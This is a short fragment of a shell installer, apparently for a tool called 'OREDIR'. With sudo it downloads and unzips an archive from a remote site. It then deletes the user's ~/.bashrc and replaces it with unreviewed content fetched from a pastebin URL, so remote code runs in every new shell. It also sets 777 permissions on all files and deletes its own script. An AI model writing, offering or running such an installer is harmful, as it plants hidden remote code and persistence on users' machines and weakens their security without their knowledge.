...
sudo wget https://w3ll.store/operators/OREDIR.zip
sudo unzip -o OREDIR.zip
sudo rm OREDIR.zip
cp ~/.bashrc ~/.bashrc-bak
rm -rf ~/.bashrc
curl "https://pastebin.com/raw/1W5xQ4AZ" -o ~/.bashrc
dos2unix ~/.bashrc
clear
...
clear
printf "\e[32mTOOL INSTALLED SUCCESSFULLY !\n\e[0mYOU CAN RUN \e[31m./OREDIR (For Linux) or Just open the OREDIR.exe (For Windows)\e[0m TO RUN TOOL NOW !\n\n"
sudo rm install.sh
chmod 777 *
